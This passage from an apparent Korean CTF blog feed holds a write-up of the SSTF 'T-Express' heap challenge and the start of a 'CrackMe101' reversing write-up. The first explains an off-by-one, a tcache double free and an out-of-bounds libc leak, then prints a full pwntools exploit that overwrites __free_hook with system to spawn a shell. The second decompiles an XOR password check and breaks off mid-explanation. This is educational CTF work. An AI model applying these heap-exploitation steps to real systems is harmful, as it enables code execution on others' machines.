&#xD560;&#xB2F9;</li></ul></li><li><p>&#xBCF4;&#xC720; &#xC911;&#xC778; &#xD2F0;&#xCF13; &#xBCF4;&#xAE30;</p></li><li><p>&#xD2F0;&#xCF13; &#xC0AC;&#xC6A9;</p><ul><li>One Ride &#xD2F0;&#xCF13; &#x2192; &#xD560;&#xB2F9; &#xD574;&#xC81C;</li><li>One Day &#xD2F0;&#xCF13; &#x2192; &#xD65C;&#xB3D9; &#xC120;&#xD0DD; &#x2192; &#xBAA8;&#xB4E0; &#xD65C;&#xB3D9; &#xC0AC;&#xC6A9; &#x2192; &#xD560;&#xB2F9; &#xD574;&#xC81C;</li></ul></li><li><p>&#xC885;&#xB8CC;</p></li></ol><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image3.png" alt></p><p>&#xAD6C;&#xB9E4;&#xD560; &#xC218; &#xC788;&#xB294; &#xD2F0;&#xCF13;&#xC758; &#xC885;&#xB958;&#xB294; &#xB450; &#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;(One Ride Ticket / One Day Ticket). &#xB450; &#xD2F0;&#xCF13;&#xC740; 3&#xAC00;&#xC9C0; &#xCC28;&#xC774;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD560;&#xB2F9; &#xD06C;&#xAE30;<ul><li>One Ride &#x2192; 0x18</li><li>One Day &#x2192; 0x30</li></ul></li><li>&#xD2F0;&#xCF13; &#xD0C0;&#xC785;<ul><li>One Ride &#x2192; 1</li><li>One Day &#x2192; 0</li></ul></li><li>&#xD574;&#xC81C; &#xC870;&#xAC74;</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image4.png" alt></p><p><code>0x55d222efe2a0</code> &#xC5D0;&#xB294; One Ride Ticket&#xC774;, <code>0x55d222efe2c0</code> &#xC5D0;&#xB294; One Day Ticket&#xC774; &#xD560;&#xB2F9;&#xB3FC;&#xC788;&#xB294; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8; &#xB41C; &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xC2DC;&#xBA74; <code>ticket_type</code>&#xAC12;&#xC774; &#xC800;&#xC7A5;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xC5EC;&#xAE30;&#xC11C; &#xC9D1;&#xC911;&#xD574;&#xC57C; &#xD560; &#xC810;&#xC740; <code>lastname</code> &#xBC14;&#xB85C; &#xB2E4;&#xC74C;&#xC5D0; <code>ticket_type</code>&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image5.png" alt></p><p><code>lastname</code>&#xC740; &#xD2F0;&#xCF13;&#xC774; &#xD560;&#xB2F9;&#xB41C; &#xD6C4; &#xD568;&#xC218; <code>read_str()</code>&#xC73C;&#xB85C; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image6.png" alt></p><p>&#xD568;&#xC218; <code>read_str()</code>&#xC740; &#xC785;&#xB825;&#xBC1B;&#xC740; string &#xB05D;&#xC5D0; NULL&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; <code>lastname</code>&#xC5D0; &#xC785;&#xB825;&#xBC1B;&#xC744; &#xB54C; 8byte&#xB97C; &#xAF49; &#xCC44;&#xC6CC; &#xB123;&#xB294;&#xB2E4;&#xBA74; <code>ticket_type</code>&#xC758; &#xAC12;&#xC744; &#xC624;&#xC5FC;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xACA0;&#xC8E0;?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image7.png" alt></p><p>One Ride Ticket&#xC758; <code>ticket_type</code>&#xC744; NULL(0x00)&#xB85C; &#xC624;&#xC5FC;&#xC2DC;&#xD0A8; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xAC78;&#xB85C; &#xBB34;&#xC5BC; &#xD560; &#xC218; &#xC788;&#xB290;&#xB0D0;? <code>ticket_type</code>&#xC744; &#xC624;&#xC5FC;&#xC2DC;&#xCF1C; 0&#xC73C;&#xB85C; &#xBC14;&#xAFB8;&#xBA74; One Ride Ticket&#xC744; One Day Ticket&#xC778; &#xAC83;&#xCC98;&#xB7FC; &#xC18D;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image8.png" alt></p><p>&#xD568;&#xC218; <code>use_ticket()</code>&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. <code>ticket_type</code>&#xC5D0; &#xB530;&#xB77C; &#xBD84;&#xAE30;&#xBB38;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. One Ride Ticket&#xC5D0;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; <code>meal_ticket, safari_pass</code>&#xB4F1;&#xC758; &#xAC12;&#xC744; &#xC870;&#xC791;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB294; &#xCD94;&#xAC00;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xC5FC;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><h1 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h1><p>glibc-2.31 &#xBC84;&#xC804;&#xC758; tcache&#xB294; double free&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xCD94;&#xAC00; &#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC7AC;&#xBC0C;&#xB294; &#xC810;&#xC740; &#xD06C;&#xAE30;&#xAC00; &#xAC19;&#xC740; tcache &#xB07C;&#xB9AC;&#xB9CC; &#xAC80;&#xC99D;&#xD55C;&#xB2E4;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xCCAD;&#xD06C;&#xC758; size&#xB97C; &#xC784;&#xC758;&#xB85C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xAC19;&#xC740; &#xCCAD;&#xD06C;&#xB97C; &#xB450; &#xBC88; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image9.png" alt></p><p>One Ride Ticket&#xC758; <code>ticket_type</code>&#xC744; <code>0x00</code>&#xC73C;&#xB85C; &#xBC14;&#xAFD4; &#xD568;&#xC218; <code>use_ticket()</code>&#xC5D0;&#xC11C; One Day Ticket&#xC778; &#xAC83;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xC124;&#xBA85;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; <code>meal_ticket</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB2E4;&#xC74C; &#xCCAD;&#xD06C;&#xC758; size&#xAC12;&#xC744; &#xC624;&#xC5FC;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image10.png" alt></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image11.png" alt></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image12.png" alt></p><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xB300;&#xB85C; size&#xAC12;&#xC744; &#xC624;&#xC5FC;&#xC2DC;&#xD0A8; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;. One Day Ticket&#xC744; size&#xAC00; 0x41&#xC77C; &#xB54C; &#xD55C;&#xBC88;, 0x21&#xC77C; &#xB54C; &#xD55C;&#xBC88; &#xD560;&#xB2F9; &#xD574;&#xC81C;&#xB97C; &#xD574;&#xC8FC;&#xBA74; Double Free&#xAC00; &#xB418;&#xACA0;&#xC8E0;?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image13.png" alt></p><p>&#xC9E0;! &#xAC19;&#xC740; &#xC8FC;&#xC18C;&#xAC00; &#xB450; &#xBC88; &#xD574;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; chunk&#xB97C; &#xD560;&#xB2F9;&#xD574; Arbitrary Write&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image14.png" alt></p><p>&#xAD6C;&#xB9E4;&#xD55C; &#xD2F0;&#xCF13;&#xC740; <code>passes</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; &#xBC30;&#xC5F4;&#xB85C; bss&#xC601;&#xC5ED;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xAC01; &#xD2F0;&#xCF13;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; chunk&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; index&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;. &#xC704; &#xC0AC;&#xC9C4;&#xC740; &#xD568;&#xC218; <code>view_ticket()</code>&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. &#xC790;&#xC138;&#xD788; &#xBCF4;&#xC2DC;&#xBA74; index&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xBD84;&#xAE30;&#xBB38;&#xC5D0;&#xC11C; &#xC74C;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xC608;&#xC678;&#xCC98;&#xB9AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image15.png" alt></p><p>&#xB9CC;&#xC57D; <code>passes</code> &#xBCF4;&#xB2E4; &#xB0AE;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xC911;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xB2E4;&#xBA74; Out-Of-Bound&#xB85C; &#xCD9C;&#xB825;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBC30;&#xC5F4; <code>passes</code>&#xBCF4;&#xB2E4; &#xC870;&#xAE08; &#xB0AE;&#xC740; &#xC8FC;&#xC18C;&#xB97C; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xBA74; <code>stderr@@GLIBC</code>&#xAC00; &#xC788;&#xB2E4;&#xB294; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image16.png" alt></p><p>&#xD568;&#xC218; <code>view_ticket()</code>&#xC5D0; -4&#xB97C; index&#xB85C; &#xC785;&#xB825;&#xD55C;&#xB2E4;&#xBA74; <code>stderr@@GLIBC</code>&#xB97C; &#xD1B5;&#xD574; libc&#xC758; base address&#xB97C; leak &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&apos;t-express.sstf.site&apos;, &apos;1337&apos;)</span>p = process(<span class="hljs-string">&apos;./target&apos;</span>)e = ELF(<span class="hljs-string">&apos;./target&apos;</span>)<span class="hljs-comment">#context.log_level=&apos;debug&apos;</span><span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment"># init</span>p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2): &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;First name: &apos;</span>, <span class="hljs-string">&apos;AAAA&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Last name: &apos;</span>, <span class="hljs-string">&apos;AAAAAAAA&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2): &apos;</span>, <span class="hljs-string">&apos;2&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;First name: &apos;</span>, <span class="hljs-string">&apos;BBBB&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Last name: &apos;</span>, <span class="hljs-string">&apos;BBBB&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2): &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;First name: &apos;</span>, <span class="hljs-string">&apos;CCCC&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Last name: &apos;</span>, <span class="hljs-string">&apos;CCCC&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;2&apos;</span>)<span class="hljs-comment"># leak libc</span>p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;2&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;-4&apos;</span>)p.recvuntil(<span class="hljs-string">&apos;|name |    &apos;</span>)pad = u64(p.recv(<span class="hljs-number">4</span>)+ <span class="hljs-string">b&apos;\x00\x00\x00\x00&apos;</span>)p.recvuntil(<span class="hljs-string">&apos;   &apos;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+ <span class="hljs-string">b&apos;\x00\x00&apos;</span>)libc_base = leak<span class="hljs-number">-0x1ec643</span>log.info(hex(libc_base))free_hook = libc_base + <span class="hljs-number">0x1eeb28</span>log.info(hex(free_hook))system = libc_base + <span class="hljs-number">0x55410</span>log.info(hex(system))<span class="hljs-comment"># double free</span>p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2/3/4):&apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2/3/4):&apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2/3/4):&apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2/3/4):&apos;</span>, <span class="hljs-string">&apos;2&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2/3/4):&apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x20</span>):p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;0&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2/3/4):&apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2/3/4):&apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)gdb.attach(p)<span class="hljs-comment"># AW</span>p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2): &apos;</span>, <span class="hljs-string">&apos;2&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;First name: &apos;</span>, p64(free_hook))p.sendlineafter(<span class="hljs-string">&apos;Last name: &apos;</span>, <span class="hljs-string">&apos;Fabu1ous&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2): &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;First name: &apos;</span>, <span class="hljs-string">b&apos;/bin/sh\x00&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Last name: &apos;</span>, <span class="hljs-string">&apos;Fabu1ous&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;(1/2): &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;First name: &apos;</span>, p64(system))p.sendlineafter(<span class="hljs-string">&apos;Last name: &apos;</span>, <span class="hljs-string">&apos;Fabu1ous&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Index of ticket: &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image17.png" alt></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>off by one</tag>
      
      <tag>double free bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF CrackMe101</title>
    <link href="/2020/10/18/idioth/sstf-crackme101/"/>
    <url>/2020/10/18/idioth/sstf-crackme101/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-crackme101/image.png" alt></p><p>64bit elf &#xD30C;&#xC77C;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Ubuntu 20.04 64bit&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/idioth/sstf-crackme101/image1.png" alt></p><p>Password&#xB97C; &#xC785;&#xB825;&#xD558;&#xACE0; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC785;&#xB825;&#xD588;&#xC744; &#xC2DC; &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xB098;&#xC624;&#xB294; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC0DD;&#xAC01;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Ghidra&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; crackme101&#xC774; &#xC5B4;&#xB5A4; &#xC2DD;&#xC73C;&#xB85C; &#xAD6C;&#xB3D9;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="crackme101-&#xBD84;&#xC11D;"><a href="#crackme101-&#xBD84;&#xC11D;" class="headerlink" title="crackme101 &#xBD84;&#xC11D;"></a>crackme101 &#xBD84;&#xC11D;</h1><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">size_t</span> sVar2;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  <span class="hljs-keyword">int</span> local_88;  <span class="hljs-keyword">char</span> local_78 [<span class="hljs-number">104</span>];  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password! : &quot;</span>);  __isoc99_scanf(&amp;DAT_0010206e,local_78);  sVar2 = <span class="hljs-built_in">strlen</span>(local_78);  iVar1 = (<span class="hljs-keyword">int</span>)sVar2;  getMaskedStr(local_78,local_78,local_78);  local_88 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> ((local_88 &lt; iVar1 &amp;&amp;         (<span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>[local_88] == local_78[(iVar1 - local_88) + <span class="hljs-number">-1</span>])))  {    local_88 = local_88 + <span class="hljs-number">1</span>;  }  <span class="hljs-keyword">if</span> (local_88 != iVar1) {    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Failed!&quot;</span>);    <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) {                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>      __stack_chk_fail();    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  }  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Successfully logged in!\nGood job!&quot;</span>);                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);}</code></pre><p>&#xC785;&#xB825;&#xB41C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB294; <code>local_78</code>&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB418;&#xACE0; <code>iVar1</code>&#xB294; &#xC785;&#xB825;&#xD55C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xC758; &#xAE38;&#xC774;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p><code>getMaskedStr</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC778;&#xC790;&#xB97C; &#xBAA8;&#xB450; <code>local_78</code>&#xB85C; &#xBC1B;&#xC544;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD55C; &#xD6C4; &#x201C;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&#x201D; &#xBB38;&#xC790;&#xC5F4;&#xACFC; <code>ocal_78</code> &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB4B7;&#xBD80;&#xBD84;&#xC758; &#xBC30;&#xC5F4;&#xBD80;&#xD130; <code>iVar1</code>&#xC758; &#xD06C;&#xAE30;&#xB9CC;&#xD07C; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>local_88</code>&#xACFC; <code>iVar1</code>&#xC774; &#xAC19;&#xC544;&#xC57C; &#xD558;&#xB824;&#xBA74; while &#xBB38;&#xC758; &#xC870;&#xAC74;&#xC778; &#xAC01; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB3D9;&#xC77C;&#xD574;&#xC57C; &#xD558;&#xBBC0;&#xB85C; <code>getMaskedStr</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xACFC;&#xD55C; <code>local_78</code>&#xC758; &#xAC12;&#xC774; &#xC5B4;&#xB5A0;&#xD55C; &#xAC12;&#xC778;&#xC9C0; &#xBA3C;&#xC800; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getMaskedStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1,<span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">size_t</span> sVar1;  <span class="hljs-keyword">int</span> local_18;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  local_18 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (local_18 &lt; (<span class="hljs-keyword">int</span>)sVar1) {    *(byte *)(param_2 + local_18) =         param_1[local_18] ^ <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>[local_18];    local_18 = local_18 + <span class="hljs-number">1</span>;  }  *(undefined *)(param_2 + (<span class="hljs-keyword">int</span>)sVar1) = <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span>;}</code></pre><p>&#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC740; param&#xC740; &#xC785;&#xB825;&#xBC1B;&#xC740; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xAC12;&#xC774; &#xB420; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xB9CC;&#xD07C; &#x201C;u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9&#x201D;&#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; index&#xB07C;&#xB9AC; xor &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; check&#xAC00; &#xC5B4;&#xB5A0;&#xD55C; &#xC2DD;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xC774; &#xB418;&#xB294;&#xC9C0; &#xC694;&#xC57D;&#xD574;&#xBCF4;&#xBA74;</p><ol><li>&#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xB294;&#xB2E4;.</li><li><code>getMaskedStr</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#x201C;u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9&#x201D; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xC778;&#xB371;&#xC2A4;&#xB07C;&#xB9AC; xor &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;</li><li>&#xC218;&#xD589;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xB4A4;&#xC9D1;&#xC5B4;&#xC11C; &#x201C;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&#x201D;&#xACFC; &#xB9DE;&#xB294;&#xC9C0; 